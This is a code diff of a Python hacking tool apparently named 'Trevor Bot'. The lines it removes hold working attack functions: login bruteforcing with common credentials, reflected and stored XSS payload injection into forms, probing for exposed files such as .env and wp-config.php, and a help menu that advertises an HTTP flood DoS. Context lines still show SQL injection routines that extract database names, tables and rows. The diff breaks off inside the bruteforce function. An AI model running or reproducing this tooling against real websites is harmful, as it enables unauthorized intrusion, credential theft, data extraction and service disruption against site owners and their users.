-                          Example: /bruteforce:https://site.com/login
-                          Options: /bruteforce:<url>:<mode> where mode is:
-                            basic - Basic common credentials (default)
-                            wordlist - Use wordlist attack
-                            combo - Username/password combos
-                            hybrid - Hybrid attack with rules
-
-💉 /sqltest:<url>         - Advanced SQL injection testing with DB extraction
-                          Example: /sqltest:https://site.com/page.php?id=1
-
-⚡ /xsstest:<url>         - Enhanced Cross-site scripting vulnerability test
-                          Example: /xsstest:https://site.com/search.php
-
-🔒 /sslcheck:<host>       - Enhanced SSL/TLS security analysis
-                          Example: /sslcheck:example.com
-
-📜 /scrape:<url>         - Web scraping and data extraction
-                          Example: /scrape:https://example.com
-
-📥 /downldscrap          - Download scraped HTML, CSS, and JavaScript files
-                          (Must run /scrape first)
-
-💥 /dos:<url>           - HTTP Flood attack for testing purposes
-                          Example: /dos:https://example.com
-
-📝 /webinfo:<url>      - Get comprehensive website information
-                         Example: /webinfo:example.com
-NETWORK SECURITY:
-────────────────
-🌐 /portscan:<host>       - Advanced network port scanning with multiple techniques
-                          Example: /portscan:192.168.1.1
-                          Options: /portscan:<host>:<type> where type is:
-                            fast - Fast scan (top ports)
-                            full - Full port scan
-                            service - Service detection
-                            udp - UDP scan
-                            os - OS detection
-
-🔍 /hostdiscover:<range>  - Network host discovery
-                          Example: /hostdiscover:192.168.1.0/24
-
-REPORTING:
-──────────
-📊 /report                - View detailed vulnerability reports
-📋 /scraped               - View scraped data
-❓ /help                  - Show this help menu
-🚪 /exit                  - Exit Trevor Bot
-
-⚠️  WARNING: Only use on systems you own or have explicit permission to test!
-        """
-        self.typewriter_effect(help_text)
-    
-    def scrape_website(self, url):
-        """Enhanced web scraping with HTML/CSS/JS extraction and file saving capability"""
-        self.typewriter_effect(f"📜 Starting ENHANCED web scraping of: {url}")
         
-        try:
-            response = self.session.get(url, timeout=10)
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Reset scraped data
-            self.scraped_data = []
-            
-            # Create a directory for scraped files
-            domain = urlparse(url).netloc
-            self.scraped_files_dir = os.path.join(os.getcwd(), f"scraped_{domain}")
-            
-            # Remove old directory if exists
-            if os.path.exists(self.scraped_files_dir):
-                shutil.rmtree(self.scraped_files_dir)
-            
-            # Create new directory structure
-            os.makedirs(self.scraped_files_dir)
-            os.makedirs(os.path.join(self.scraped_files_dir, "css"))
-            os.makedirs(os.path.join(self.scraped_files_dir, "js"))
-            os.makedirs(os.path.join(self.scraped_files_dir, "images"))
-            
-            # Save main HTML file
-            main_html_path = os.path.join(self.scraped_files_dir, "index.html")
-            with open(main_html_path, 'w', encoding='utf-8') as f:
-                f.write(response.text)
-            
-            self.typewriter_effect(f"\n💾 Saved main HTML to: {main_html_path}")
-            
-            # 1. Get full HTML structure
-            self.typewriter_effect("\n🔍 Extracting HTML structure...")
-            html_structure = self.extract_html_structure(soup)
-            self.scraped_data.append({
-                'type': 'HTML Structure',
-                'data': html_structure
-            })
-            
-            # 2. Extract all CSS (inline, embedded, external)
-            self.typewriter_effect("\n🎨 Extracting CSS...")
-            css_data = self.extract_css(soup, url)
-            self.scraped_data.append({
-                'type': 'CSS',
-                'data': css_data
-            })
-            
-            # Save CSS files
-            for i, css in enumerate(css_data['external']):
-                css_path = os.path.join(self.scraped_files_dir, "css", f"external_{i}.css")
-                with open(css_path, 'w', encoding='utf-8') as f:
-                    f.write(css['content'])
-                self.typewriter_effect(f"💾 Saved CSS to: {css_path}")
-            
-            # 3. Extract all JavaScript
-            self.typewriter_effect("\n⚡ Extracting JavaScript...")
-            js_data = self.extract_javascript(soup, url)
-            self.scraped_data.append({
-                'type': 'JavaScript',
-                'data': js_data
-            })
-            
-            # Save JavaScript files
-            for i, js in enumerate(js_data['external']):
-                js_path = os.path.join(self.scraped_files_dir, "js", f"external_{i}.js")
-                with open(js_path, 'w', encoding='utf-8') as f:
-                    f.write(js['content'])
-                self.typewriter_effect(f"💾 Saved JS to: {js_path}")
-            
-            # 4. Extract all links
-            self.typewriter_effect("\n🔗 Extracting links...")
-            links = [a.get('href') for a in soup.find_all('a', href=True)]
-            self.scraped_data.append({
-                'type': 'Links',
-                'data': links[:50]  # Store first 50 links
-            })
-            
-            # 5. Extract all images
-            self.typewriter_effect("\n🖼️ Extracting images...")
-            images = [img.get('src') for img in soup.find_all('img', src=True)]
-            self.scraped_data.append({
-                'type': 'Images',
-                'data': images[:20]  # Store first 20 images
-            })
-            
-            # Download images
-            for i, img_url in enumerate(images[:10]):  # Download first 10 images
-                try:
-                    if not img_url.startswith(('http', 'https')):
-                        img_url = urljoin(url, img_url)
-                    
-                    img_response = self.session.get(img_url, stream=True, timeout=5)
-                    if img_response.status_code == 200:
-                        img_path = os.path.join(self.scraped_files_dir, "images", f"image_{i}{Path(img_url).suffix}")
-                        with open(img_path, 'wb') as f:
-                            for chunk in img_response.iter_content(1024):
-                                f.write(chunk)
-                        self.typewriter_effect(f"💾 Saved image to: {img_path}")
-                except Exception as e:
-                    continue
-            
-            # 6. Extract all forms
-            self.typewriter_effect("\n📝 Extracting forms...")
-            forms = []
-            for form in soup.find_all('form'):
-                form_data = self.extract_form_details(form)
-                forms.append(form_data)
-            self.scraped_data.append({
-                'type': 'Forms',
-                'data': forms
-            })
-            
-            # 7. Extract meta tags
-            self.typewriter_effect("\n🏷️ Extracting meta tags...")
-            metas = []
-            for meta in soup.find_all('meta'):
-                metas.append({
-                    'name': meta.get('name'),
-                    'content': meta.get('content'),
-                    'property': meta.get('property')
-                })
-            self.scraped_data.append({
-                'type': 'Meta Tags',
-                'data': metas[:20]  # Store first 20 meta tags
-            })
-            
-            # 8. Extract text content
-            self.typewriter_effect("\n📄 Extracting text content...")
-            text = ' '.join([p.get_text() for p in soup.find_all('p')])
-            self.scraped_data.append({
-                'type': 'Text Content',
-                'data': text[:1000] + '...'  # Store first 1000 chars
-            })
-            
-            # 9. Extract emails
-            self.typewriter_effect("\n✉️ Extracting emails...")
-            emails = re.findall(r'[\w\.-]+@[\w\.-]+', response.text)
-            if emails:
-                self.scraped_data.append({
-                    'type': 'Emails',
-                    'data': list(set(emails))  # Remove duplicates
-                })
-            
-            # 10. Extract phone numbers
-            self.typewriter_effect("\n📞 Extracting phone numbers...")
-            phone_numbers = re.findall(r'(\+?\d[\d\s\-\(\)]{7,}\d)', response.text)
-            if phone_numbers:
-                self.scraped_data.append({
-                    'type': 'Phone Numbers',
-                    'data': list(set(phone_numbers))  # Remove duplicates
-                })
-            
-            self.typewriter_effect("\n✅ Enhanced web scraping completed!")
-            self.typewriter_effect(f"📁 All scraped files saved to: {self.scraped_files_dir}")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Web scraping failed: {str(e)}")
-    
-    def download_scraped_files(self):
-        """Download all scraped files as a zip archive"""
-        if not self.scraped_files_dir or not os.path.exists(self.scraped_files_dir):
-            self.typewriter_effect("❌ No scraped files available. Run /scrape first.")
-            return
+    def loading_animation(self, text, delay=None):
+        # Bersihkan kode ANSI sebelum mencetak
+        clean_text = clean_ansi(f"\n{C['C']}⏳ {text}...{C['RESET']}")
+        self.typewriter_effect(clean_text)
         
-        try:
-            # Create zip file name
-            domain = os.path.basename(self.scraped_files_dir).replace("scraped_", "")
-            zip_filename = f"scraped_{domain}_{int(time.time())}.zip"
-            
-            # Create zip archive
-            shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', self.scraped_files_dir)
-            
-            self.typewriter_effect(f"\n📦 Successfully created zip archive: {zip_filename}")
-            self.typewriter_effect(f"💾 Path: {os.path.join(os.getcwd(), zip_filename)}")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Failed to create zip archive: {str(e)}")
-    
-    def extract_html_structure(self, soup):
-        """Extract HTML structure with important elements"""
-        html_data = {
-            'doctype': '',
-            'html_tag': {},
-            'head_elements': [],
-            'body_structure': []
-        }
-        
-        # Get DOCTYPE
-        if soup.original_encoding:
-            html_data['doctype'] = f"<!DOCTYPE {soup.original_encoding}>"
-        
-        # Get HTML tag attributes
-        if soup.html:
-            html_data['html_tag'] = dict(soup.html.attrs)
-        
-        # Get HEAD elements
-        if soup.head:
-            for child in soup.head.children:
-                if child.name:
-                    element = {
-                        'tag': child.name,
-                        'attributes': dict(child.attrs)
-                    }
-                    if child.name == 'title' and child.string:
-                        element['content'] = child.string.strip()
-                    html_data['head_elements'].append(element)
-        
-        # Get BODY structure (first 3 levels)
-        if soup.body:
-            html_data['body_structure'] = self.extract_body_structure(soup.body)
-        
-        return html_data
-
-    def extract_body_structure(self, element, level=0, max_level=3):
-        """Recursively extract body structure"""
-        if level > max_level:
-            return []
-        
-        structure = []
-        for child in element.children:
-            if child.name:
-                node = {
-                    'tag': child.name,
-                    'attributes': dict(child.attrs),
-                    'children': self.extract_body_structure(child, level+1, max_level)
-                }
-                structure.append(node)
-        
-        return structure
-
-    def extract_css(self, soup, base_url):
-        """Extract all CSS (inline, embedded, external)"""
-        css_data = {
-            'inline': [],
-            'embedded': [],
-            'external': []
-        }
-        
-        # 1. Extract inline CSS
-        for tag in soup.find_all(style=True):
-            css_data['inline'].append({
-                'tag': tag.name,
-                'styles': tag['style']
-            })
-        
-        # 2. Extract embedded CSS
-        for style in soup.find_all('style'):
-            if style.string:
-                css_data['embedded'].append(style.string.strip())
-        
-        # 3. Extract external CSS
-        for link in soup.find_all('link', rel='stylesheet'):
-            href = link.get('href')
-            if href:
-                css_url = urljoin(base_url, href)
-                try:
-                    css_response = self.session.get(css_url, timeout=5)
-                    if css_response.status_code == 200:
-                        css_data['external'].append({
-                            'url': css_url,
-                            'content': css_response.text
-                        })
-                except:
-                    pass
-        
-        return css_data
-
-    def extract_javascript(self, soup, base_url):
-        """Extract all JavaScript (inline, external)"""
-        js_data = {
-            'inline': [],
-            'external': []
-        }
-        
-        # 1. Extract inline JS
-        for script in soup.find_all('script'):
-            if script.string and not script.get('src'):
-                js_data['inline'].append(script.string.strip())
-        
-        # 2. Extract external JS
-        for script in soup.find_all('script', src=True):
-            src = script.get('src')
-            if src:
-                js_url = urljoin(base_url, src)
-                try:
-                    js_response = self.session.get(js_url, timeout=5)
-                    if js_response.status_code == 200:
-                        js_data['external'].append({
-                            'url': js_url,
-                            'content': js_response.text
-                        })
-                except:
-                    pass
-        
-        return js_data
-
-    def extract_form_details(self, form):
-        """Extract detailed form information"""
-        form_data = {
-            'action': form.get('action'),
-            'method': form.get('method', 'GET'),
-            'inputs': [],
-            'buttons': [],
-            'attributes': dict(form.attrs)
-        }
-        
-        # Extract input fields
-        for input_tag in form.find_all('input'):
-            form_data['inputs'].append({
-                'name': input_tag.get('name'),
-                'type': input_tag.get('type', 'text'),
-                'value': input_tag.get('value'),
-                'attributes': {k: v for k, v in input_tag.attrs.items() 
-                              if k not in ['name', 'type', 'value']}
-            })
-        
-        # Extract textareas
-        for textarea in form.find_all('textarea'):
-            form_data['inputs'].append({
-                'name': textarea.get('name'),
-                'type': 'textarea',
-                'value': textarea.string if textarea.string else '',
-                'attributes': {k: v for k, v in textarea.attrs.items() 
-                               if k != 'name'}
-            })
-        
-        # Extract select options
-        for select in form.find_all('select'):
-            options = []
-            for option in select.find_all('option'):
-                options.append({
-                    'value': option.get('value'),
-                    'text': option.string if option.string else ''
-                })
-            
-            form_data['inputs'].append({
-                'name': select.get('name'),
-                'type': 'select',
-                'options': options,
-                'attributes': {k: v for k, v in select.attrs.items() 
-                              if k != 'name'}
-            })
-        
-        # Extract buttons
-        for button in form.find_all('button'):
-            form_data['buttons'].append({
-                'name': button.get('name'),
-                'type': button.get('type', 'button'),
-                'text': button.string if button.string else '',
-                'attributes': {k: v for k, v in button.attrs.items() 
-                              if k not in ['name', 'type']}
-            })
-        
-        return form_data
-
-    def show_scraped_data(self):
-        """Enhanced display of scraped data with code preview"""
-        if not self.scraped_data:
-            self.typewriter_effect("\n📭 No scraped data available yet!")
-            return
-        
-        self.typewriter_effect("\n📋 ENHANCED SCRAPED DATA REPORT:")
-        self.typewriter_effect("══════════════════════════════════════════════")
-        
-        for item in self.scraped_data:
-            self.typewriter_effect(f"\n🔍 {item['type']}:")
-            self.typewriter_effect("──────────────────────────────────────────")
-            
-            if item['type'] == 'HTML Structure':
-                self.display_html_structure(item['data'])
-            elif item['type'] == 'CSS':
-                self.display_code_data('CSS', item['data'])
-            elif item['type'] == 'JavaScript':
-                self.display_code_data('JavaScript', item['data'])
-            elif item['type'] == 'Text Content':
-                self.typewriter_effect(f"   {item['data']}")
-            elif isinstance(item['data'], list):
-                self.display_list_data(item['type'], item['data'])
-            
-            self.typewriter_effect("──────────────────────────────────────────")
-        
-        self.typewriter_effect(f"\n📋 Total data categories scraped: {len(self.scraped_data)}")
-        if self.scraped_files_dir:
-            self.typewriter_effect(f"📁 Scraped files directory: {self.scraped_files_dir}")
-
-    def display_html_structure(self, html_data):
-        """Display HTML structure in readable format"""
-        self.typewriter_effect(f"   DOCTYPE: {html_data.get('doctype', 'Not specified')}")
-        
-        self.typewriter_effect("\n   HTML Tag Attributes:")
-        for attr, value in html_data.get('html_tag', {}).items():
-            self.typewriter_effect(f"      {attr}: {value}")
-        
-        self.typewriter_effect("\n   HEAD Elements:")
-        for element in html_data.get('head_elements', [])[:5]:  # Show first 5
-            self.typewriter_effect(f"      <{element['tag']}>")
-            for attr, value in element.get('attributes', {}).items():
-                self.typewriter_effect(f"         {attr}: {value}")
-            if 'content' in element:
-                self.typewriter_effect(f"         Content: {element['content']}")
-        
-        self.typewriter_effect("\n   BODY Structure (simplified):")
-        self.display_html_nodes(html_data.get('body_structure', []), depth=1)
-
-    def display_html_nodes(self, nodes, depth=0, max_depth=2):
-        """Recursively display HTML nodes"""
-        if depth > max_depth:
-            return
-        
-        for node in nodes[:3]:  # Show first 3 nodes at each level
-            indent = '   ' * (depth + 1)
-            self.typewriter_effect(f"{indent}<{node['tag']}>")
-            
-            # Display attributes if any
-            for attr, value in node.get('attributes', {}).items():
-                self.typewriter_effect(f"{indent}   {attr}: {value}")
-            
-            # Recursively display children
-            if node.get('children'):
-                self.display_html_nodes(node['children'], depth+1, max_depth)
-
-    def display_code_data(self, code_type, code_data):
-        """Display CSS or JavaScript code data"""
-        if code_type == 'CSS':
-            self.typewriter_effect("   Inline Styles:")
-            for style in code_data.get('inline', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      <{style['tag']}>: {style['styles'][:100]}...")
-            
-            self.typewriter_effect("\n   Embedded CSS:")
-            for css in code_data.get('embedded', [])[:1]:  # Show first 1
-                self.typewriter_effect(f"      {css[:200]}...")
-            
-            self.typewriter_effect("\n   External CSS Files:")
-            for css in code_data.get('external', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      URL: {css['url']}")
-                self.typewriter_effect(f"      Content Sample: {css['content'][:200]}...")
-        
-        elif code_type == 'JavaScript':
-            self.typewriter_effect("   Inline JavaScript:")
-            for js in code_data.get('inline', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      {js[:200]}...")
-            
-            self.typewriter_effect("\n   External JavaScript Files:")
-            for js in code_data.get('external', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      URL: {js['url']}")
-                self.typewriter_effect(f"      Content Sample: {js['content'][:200]}...")
-
-    def display_list_data(self, data_type, data_list):
-        """Display list-type data (links, images, etc.)"""
-        if data_type == 'Forms':
-            for i, form in enumerate(data_list[:2], 1):  # Show first 2 forms
-                self.typewriter_effect(f"   Form {i}:")
-                self.typewriter_effect(f"      Action: {form.get('action')}")
-                self.typewriter_effect(f"      Method: {form.get('method')}")
-                self.typewriter_effect(f"      Inputs: {len(form.get('inputs', []))}")
-                self.typewriter_effect(f"      Buttons: {len(form.get('buttons', []))}")
-        else:
-            for i, item in enumerate(data_list[:5], 1):  # Show first 5 items
-                if isinstance(item, str):
-                    self.typewriter_effect(f"   {i}. {item}")
-                elif isinstance(item, dict):
-                    if data_type == 'Meta Tags':
-                        self.typewriter_effect(f"   {i}. Name: {item.get('name')}")
-                        self.typewriter_effect(f"      Content: {item.get('content')}")
-                        self.typewriter_effect(f"      Property: {item.get('property')}")
-        
-        if len(data_list) > 5:
-            self.typewriter_effect(f"   ... and {len(data_list)-5} more items")
-
-    def xss_test(self, url):
-        """Enhanced Cross-Site Scripting vulnerability testing"""
-        self.typewriter_effect(f"⚡ Starting ENHANCED XSS test on: {url}")
-        self.loading_animation("Analyzing URL parameters for XSS vectors", 2)
-        
-        try:
-            parsed_url = urlparse(url)
-            params = parse_qs(parsed_url.query)
-            
-            if not params:
-                self.typewriter_effect("❌ No parameters found in URL for testing")
-                return
-            
-            self.typewriter_effect(f"🎯 Testing {len(params)} parameter(s) with advanced techniques")
-            
-            # Test each parameter with all XSS payloads
-            for param_name, param_values in params.items():
-                self.typewriter_effect(f"\n🔍 Testing parameter: {param_name}")
-                
-                original_value = param_values[0] if param_values else ''
-                
-                # Test each XSS payload
-                for payload in self.xss_payloads:
-                    try:
-                        # Create test URL with payload
-                        test_params = params.copy()
-                        test_params[param_name] = [payload]
-                        
-                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-                        
-                        # Send GET request
-                        response = self.session.get(test_url, params=test_params, timeout=10)
-                        
-                        # Check if payload was reflected in response
-                        if payload in response.text:
-                            # Check if payload was executed (basic check)
-                            if any(tag in response.text.lower() for tag in ['<script>', 'onerror=', 'onload=', 'javascript:']):
-                                self.typewriter_effect(f"\n🚨 XSS VULNERABILITY DETECTED!")
-                                self.typewriter_effect(f"   Parameter: {param_name}")
-                                self.typewriter_effect(f"   Payload: {payload}")
-                                self.typewriter_effect(f"   Payload was reflected and appears executable")
-                                
-                                self.vulnerabilities.append({
-                                    'type': 'XSS',
-                                    'description': f"Reflected XSS in parameter '{param_name}'",
-                                    'severity': 'High',
-                                    'parameter': param_name,
-                                    'payload': payload,
-                                    'url': url,
-                                    'context': self.detect_xss_context(response.text, payload)
-                                })
-                            else:
-                                self.typewriter_effect(f"\n⚠️ XSS PAYLOAD REFLECTED BUT MAY NOT EXECUTE")
-                                self.typewriter_effect(f"   Parameter: {param_name}")
-                                self.typewriter_effect(f"   Payload: {payload}")
-                                
-                                self.vulnerabilities.append({
-                                    'type': 'Potential XSS',
-                                    'description': f"Potential XSS in parameter '{param_name}' (payload reflected but may not execute)",
-                                    'severity': 'Medium',
-                                    'parameter': param_name,
-                                    'payload': payload,
-                                    'url': url,
-                                    'context': self.detect_xss_context(response.text, payload)
-                                })
-                        
-                        time.sleep(0.2)  # Rate limiting
-                        
-                    except Exception as e:
-                        continue
-            
-            # Test for stored XSS if it's a form submission URL
-            if parsed_url.path.endswith(('.php', '.asp', '.aspx', '.jsp', '.do', '.action')):
-                self.typewriter_effect("\n🔍 Testing for stored XSS vulnerabilities...")
-                self.test_stored_xss(url)
-            
-            self.typewriter_effect("\n✅ Enhanced XSS testing completed")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ XSS test failed: {str(e)}")
-    
-    def detect_xss_context(self, response_text, payload):
-        """Detect the context where the XSS payload appears in the response"""
-        try:
-            soup = BeautifulSoup(response_text, 'html.parser')
-            
-            # Check if payload appears in script tag
-            scripts = soup.find_all('script', string=lambda t: payload in str(t))
-            if scripts:
-                return "JavaScript context"
-            
-            # Check if payload appears in HTML attribute
-            for tag in soup.find_all():
-                for attr, value in tag.attrs.items():
-                    if isinstance(value, str) and payload in value:
-                        return f"HTML attribute context ({attr})"
-                    elif isinstance(value, list) and any(payload in v for v in value):
-                        return f"HTML attribute context ({attr})"
-            
-            # Check if payload appears in URL
-            if payload in soup.find_all(href=lambda x: x and payload in x):
-                return "URL context (href)"
-            if payload in soup.find_all(src=lambda x: x and payload in x):
-                return "URL context (src)"
-            
-            # Check if payload appears in CSS
-            styles = soup.find_all('style', string=lambda t: payload in str(t))
-            if styles:
-                return "CSS context"
-            
-            # Check if payload appears directly in HTML
-            if payload in response_text:
-                return "HTML body context"
-            
-            return "Unknown context"
-        except:
-            return "Context detection failed"
-    
-    def test_stored_xss(self, url):
-        """Test for stored XSS vulnerabilities by submitting forms"""
-        try:
-            response = self.session.get(url, timeout=10)
-            soup = BeautifulSoup(response.text, 'html.parser')
-            forms = soup.find_all('form')
-            
-            if not forms:
-                self.typewriter_effect("⚠️ No forms found for stored XSS testing")
-                return
-            
-            self.typewriter_effect(f"🔍 Found {len(forms)} forms to test for stored XSS")
-            
-            for form in forms:
-                form_details = self.get_form_details(form)
-                form_url = urljoin(url, form_details['action'])
-                
-                self.typewriter_effect(f"\n🔍 Testing form at: {form_url}")
-                
-                # Select 3 representative XSS payloads to test
-                test_payloads = [
-                    "<script>alert('Stored XSS')</script>",
-                    "<img src=x onerror=alert('Stored XSS')>",
-                    "\" onmouseover=alert('Stored XSS') \""
-                ]
-                
-                for payload in test_payloads:
-                    try:
-                        # Prepare form data with XSS payload
-                        form_data = {}
-                        for input_tag in form_details['inputs']:
-                            if input_tag['type'] == 'hidden':
-                                form_data[input_tag['name']] = input_tag['value']
-                            elif input_tag['type'] == 'submit':
-                                form_data[input_tag['name']] = input_tag.get('value', '')
-                            else:
-                                form_data[input_tag['name']] = payload
-                        
-                        # Submit the form
-                        if form_details['method'] == 'post':
-                            response = self.session.post(form_url, data=form_data, timeout=10)
-                        else:
-                            response = self.session.get(form_url, params=form_data, timeout=10)
-                        
-                        # Check if payload appears in response (basic stored XSS check)
-                        if payload in response.text:
-                            self.typewriter_effect(f"\n⚠️ POTENTIAL STORED XSS DETECTED IN FORM SUBMISSION")
-                            self.typewriter_effect(f"   Payload: {payload}")
-                            self.typewriter_effect(f"   Form action: {form_url}")
-                            
-                            self.vulnerabilities.append({
-                                'type': 'Potential Stored XSS',
-                                'description': f"Potential stored XSS in form submission to '{form_url}'",
-                                'severity': 'High',
-                                'payload': payload,
-                                'url': form_url,
-                                'context': 'Form submission'
-                            })
-                        
-                    except Exception as e:
-                        continue
-        
-        except Exception as e:
-            self.typewriter_effect(f"❌ Stored XSS test failed: {str(e)}")
-    
     def sql_injection_test(self, url):
         """Advanced SQL injection vulnerability testing with database extraction"""
         self.typewriter_effect(f"💉 Starting ADVANCED SQL injection test on: {url}")
-        self.loading_animation("Analyzing URL parameters for SQLi vectors", 2)
+        self.loading_animation("Analyzing URL parameters for SQLi vectors")
         
         try:
             parsed_url = urlparse(url)
@@ -1379,7 +451,7 @@ REPORTING:
             
         except Exception as e:
             self.typewriter_effect(f"❌ SQL injection test failed: {str(e)}")
-
+    
     def extract_database_data(self, base_url, param_name, original_params):
         """Extract database structure and content from vulnerable parameter"""
         self.typewriter_effect(f"\n🔍 Attempting to extract database information from parameter: {param_name}")
@@ -1416,7 +488,7 @@ REPORTING:
                         self.extract_table_data(base_url, param_name, original_params, db_type, table, columns)
         else:
             self.typewriter_effect("❌ Failed to identify database type for extraction")
-
+    
     def identify_database_type(self, base_url, param_name, original_params):
         """Identify the database type using version extraction techniques"""
         version_payloads = {
@@ -1449,7 +521,7 @@ REPORTING:
                 continue
         
         return None
-
+    
     def extract_database_version(self, base_url, param_name, original_params, db_type):
         """Extract database version information"""
         self.typewriter_effect("\n🔧 Extracting database version...")
@@ -1493,7 +565,7 @@ REPORTING:
         
         self.typewriter_effect("⚠️ Could not extract database version")
         return None
-
+    
     def extract_database_name(self, base_url, param_name, original_params, db_type):
         """Extract current database name"""
         self.typewriter_effect("\n🔧 Extracting database name...")
@@ -1537,7 +609,7 @@ REPORTING:
         
         self.typewriter_effect("⚠️ Could not extract database name")
         return None
-
+    
     def extract_database_tables(self, base_url, param_name, original_params, db_type):
         """Extract list of tables from database"""
         self.typewriter_effect("\n🔧 Extracting database tables...")
@@ -1590,7 +662,7 @@ REPORTING:
         
         self.typewriter_effect("⚠️ Could not extract database tables")
         return None
-
+    
     def extract_table_columns(self, base_url, param_name, original_params, db_type, table):
         """Extract columns from a specific table"""
         self.typewriter_effect(f"\n🔧 Extracting columns from table: {table}")
@@ -1650,7 +722,7 @@ REPORTING:
         
         self.typewriter_effect(f"⚠️ Could not extract columns from table {table}")
         return None
-
+    
     def extract_table_data(self, base_url, param_name, original_params, db_type, table, columns):
         """Extract sample data from a table"""
         self.typewriter_effect(f"\n🔧 Extracting sample data from table: {table}")
@@ -1707,1738 +779,7 @@ REPORTING:
         except Exception as e:
             self.typewriter_effect(f"❌ Failed to extract data: {str(e)}")
             return None
-
-    def comprehensive_scan(self, url):
-        """Perform comprehensive security scan"""
-        self.typewriter_effect(f"🕷️ Starting comprehensive security scan for: {url}")
-        
-        try:
-            # Check if URL is valid
-            parsed_url = urlparse(url)
-            if not all([parsed_url.scheme, parsed_url.netloc]):
-                raise ValueError("Invalid URL format")
-            
-            self.loading_animation("Scanning target website", 2)
-            
-            # Perform various security tests
-            self.typewriter_effect("\n🔍 Running SQL injection test...")
-            self.sql_injection_test(url)
-            
-            self.typewriter_effect("\n🔍 Running XSS test...")
-            self.xss_test(url)
-            
-            # Check for common vulnerabilities
-            self.typewriter_effect("\n🔍 Checking for common vulnerabilities...")
-            self.check_common_vulnerabilities(url)
-            
-            # Check server information
-            self.typewriter_effect("\n🔍 Gathering server information...")
-            self.check_server_info(url)
-            
-            self.typewriter_effect("\n✅ Comprehensive scan completed!")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Comprehensive scan failed: {str(e)}")
-
-    def check_common_vulnerabilities(self, url):
-        """Check for common web vulnerabilities"""
-        try:
-            # Check for directory listing
-            test_url = urljoin(url, "/")
-            response = self.session.get(test_url, timeout=10)
-            
-            if "Index of /" in response.text:
-                self.typewriter_effect("\n⚠️ Directory listing enabled!")
-                self.vulnerabilities.append({
-                    'type': 'Directory Listing',
-                    'description': 'Directory listing is enabled',
-                    'severity': 'Medium',
-                    'url': test_url
-                })
-            
-            # Check for common files
-            common_files = [
-                'robots.txt', '.git/HEAD', '.env', 'wp-config.php',
-                'config.php', 'phpinfo.php', 'test.php'
-            ]
-            
-            for file in common_files:
-                test_url = urljoin(url, file)
-                response = self.session.get(test_url, timeout=5)
-                
-                if response.status_code == 200:
-                    self.typewriter_effect(f"\n⚠️ Sensitive file accessible: {file}")
-                    self.vulnerabilities.append({
-                        'type': 'Sensitive File Exposure',
-                        'description': f'Sensitive file accessible: {file}',
-                        'severity': 'High',
-                        'url': test_url
-                    })
-        
-        except Exception as e:
-            self.typewriter_effect(f"❌ Common vulnerabilities check failed: {str(e)}")
-
-    def check_server_info(self, url):
-        """Gather server information"""
-        try:
-            headers = self.session.head(url, timeout=10).headers
-            
-            server_info = {
-                'Server': headers.get('Server', 'Not disclosed'),
-                'X-Powered-By': headers.get('X-Powered-By', 'Not disclosed'),
-                'Content-Type': headers.get('Content-Type', 'Not disclosed')
-            }
-            
-            self.typewriter_effect("\n🛠️ Server Information:")
-            for key, value in server_info.items():
-                self.typewriter_effect(f"   {key}: {value}")
-            
-            # Check for outdated server versions
-            if 'Apache' in server_info['Server'] and '2.2' in server_info['Server']:
-                self.typewriter_effect("\n⚠️ Outdated Apache version detected (2.2.x is EOL)")
-                self.vulnerabilities.append({
-                    'type': 'Outdated Server',
-                    'description': 'Outdated Apache server version detected',
-                    'severity': 'High',
-                    'info': server_info['Server']
-                })
-            
-            if 'PHP' in server_info['X-Powered-By'] and '5.' in server_info['X-Powered-By']:
-                self.typewriter_effect("\n⚠️ Outdated PHP version detected (5.x is EOL)")
-                self.vulnerabilities.append({
-                    'type': 'Outdated PHP',
-                    'description': 'Outdated PHP version detected',
-                    'severity': 'High',
-                    'info': server_info['X-Powered-By']
-                })
-        
-        except Exception as e:
-            self.typewriter_effect(f"❌ Server information check failed: {str(e)}")
-
-    def bruteforce_login(self, url):
-        """Bruteforce login with common credentials"""
-        self.typewriter_effect(f"🔓 Starting login bruteforce on: {url}")
-        self.loading_animation("Preparing credential combinations", 1)
-        
-        try:
-            # Check if URL is a login page
-            response = self.session.get(url, timeout=10)
-            
-            # Look for login form
-            soup = BeautifulSoup(response.text, 'html.parser')
-            login_form = soup.find('form', {'action': lambda x: x and ('login' in x.lower() or 'signin' in x.lower())})
-            
-            if not login_form:
-                login_form = soup.find('form')
-                if not login_form:
-                    raise ValueError("No login form found on page")
-            
-            form_details = self.get_form_details(login_form)
-            form_url = urljoin(url, form_details['action'])
-            
-            self.typewriter_effect(f"\n🔍 Found login form at: {form_url}")
-            self.typewriter_effect(f"   Method: {form_details['method'].upper()}")
-            self.typewriter_effect(f"   Inputs: {', '.join([i['name'] for i in form_details['inputs']])}")
-            
-            # Find username and password fields
-            username_field = None
-            password_field = None
-            
-            for input_tag in form_details['inputs']:
-                if input_tag['type'] == 'text' or input_tag['type'] == 'email':
-                    username_field = input_tag['name']
-                elif input_tag['type'] == 'password':
-                    password_field = input_tag['name']
-            
-            if not username_field or not password_field:
-                raise ValueError("Could not identify username/password fields")
-            
-            self.typewriter_effect(f"\n🔑 Attempting {len(self.common_creds)} common credentials...")
-            
-            success = False
-            for username, password in self.common_creds:
-                try:
-                    # Prepare form data
-                    form_data = {}
-                    for input_tag in form_details['inputs']:
-                        if input_tag['type'] == 'hidden':
-                            form_data[input_tag['name']] = input_tag['value']
-                        elif input_tag['name'] == username_field:
-                            form_data[input_tag['name']] = username
-                        elif input_tag['name'] == password_field:
-                            form_data[input_tag['name']] = password
-                        elif input_tag['type'] == 'submit':
-                            form_data[input_tag['name']] = input_tag.get('value', '')
-                    
-                    # Submit the form
-                    if form_details['method'] == 'post':
-                        response = self.session.post(form_url, data=form_data, timeout=10)
-                    else:
-                        response = self.session.get(form_url, params=form_data, timeout=10)
-                    
-                    # Check for successful login (basic check)
-                    if 'logout' in response.text.lower() or 'sign out' in response.text.lower() or 'welcome' in response.text.lower():
-                        self.typewriter_effect(f"\n🎉 LOGIN SUCCESSFUL!")
-                        self.typewriter_effect(f"   Username: {username}")
